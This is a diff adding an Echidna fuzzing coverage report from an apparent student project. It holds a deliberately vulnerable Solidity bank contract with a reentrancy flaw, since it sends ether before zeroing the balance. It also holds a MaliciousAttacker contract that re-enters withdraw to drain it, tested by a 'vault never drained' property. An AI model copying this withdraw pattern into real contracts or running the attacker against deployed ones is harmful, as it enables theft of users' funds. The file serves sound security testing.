@@ -1,0 +1,63 @@
+/home/ali/TFG/pruebas-echidna/contracts/VulnerableBank.sol
+  1 |     | pragma solidity ^0.8.0;
+  2 |     | 
+  3 | *   | contract VulnerableBank {
+  4 |     |     mapping(address => uint256) public balances;
+  5 |     | 
+  6 | *   |     function deposit() public payable {
+  7 | *   |         balances[msg.sender] += msg.value;
+  8 |     |     }
+  9 |     | 
+ 10 | *   |     function withdraw() public {
+ 11 | *   |         uint256 bal = balances[msg.sender];
+ 12 | *   |         require(bal > 0);
+ 13 |     | 
+ 14 |     |         //Llamada externa antes de actualizar estado
+ 15 | *   |         (bool sent, ) = msg.sender.call{value: bal}("");
+ 16 | *   |         require(sent, "Failed to send Ether");
+ 17 |     | 
+ 18 | *   |         balances[msg.sender] = 0;
+ 19 |     |     }
+ 20 |     | }
+
+/home/ali/TFG/pruebas-echidna/echidna/ReentrancyEchidnaTest.sol
+  1 |     | pragma solidity ^0.8.13;
+  2 |     | 
+  3 |     | import "../contracts/VulnerableBank.sol";
+  4 |     | 
+  5 |     | contract MaliciousAttacker {
+  6 |     |     VulnerableBank public target;
+  7 |     |     bool internal isReentering;
+  8 |     | 
+  9 | *   |     constructor(VulnerableBank _target) {
+ 10 | *   |         target = _target;
+ 11 |     |     }
+ 12 |     | 
+ 13 |     |     receive() external payable {
+ 14 | *   |         if (address(target).balance >= msg.value) {
+ 15 |     |             isReentering = true;
+ 16 |     |             target.withdraw(); 
+ 17 |     |         }
+ 18 |     |     }
+ 19 |     | 
+ 20 | *   |     function attack() public payable {
+ 21 | *   |         isReentering = false;
+ 22 |     |         
+ 23 | *   |         uint256 amount = 1 ether; 
+ 24 | *   |         if(address(this).balance >= amount) {
+ 25 | *   |             target.deposit{value: amount}();
+ 26 | *   |             target.withdraw();
+ 27 |     |         }
+ 28 |     |     }
+ 29 |     | }
+ 30 |     | 
+ 31 | *r  | contract ReentrancyEchidnaTest is MaliciousAttacker {
+ 32 | *   |     constructor() MaliciousAttacker(new VulnerableBank()) payable {
+ 33 | *   |         target.deposit{value: 10 ether}();
+ 34 |     |     }
+ 35 |     | 
+ 36 |     |     function echidna_test_vault_never_drained() public view returns (bool) {
+ 37 |     |         return address(target).balance >= 10 ether;
+ 38 |     |     }
+ 39 |     | }
+
